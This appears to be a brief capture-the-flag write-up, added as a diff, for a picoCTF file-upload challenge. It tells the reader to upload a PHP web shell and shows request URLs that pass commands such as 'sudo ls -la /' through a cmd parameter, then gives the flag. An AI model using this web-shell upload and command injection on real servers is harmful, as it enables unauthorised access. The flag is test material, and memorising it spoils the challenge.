@@ -1,0 +1,9 @@
+upload the php file which will run the commands, you can use webshell.php 
+
+then: http://standard-pizzas.picoctf.net:57978/uploads/webshell.php?cmd=sudo%20ls%20-la%20/
+
+then: ?cmd=sudo ls -la /challenge
+and cat the .json file which is there
+
+
+=> picoCTF{wh47_c4n_u_d0_wPHP_16579372}
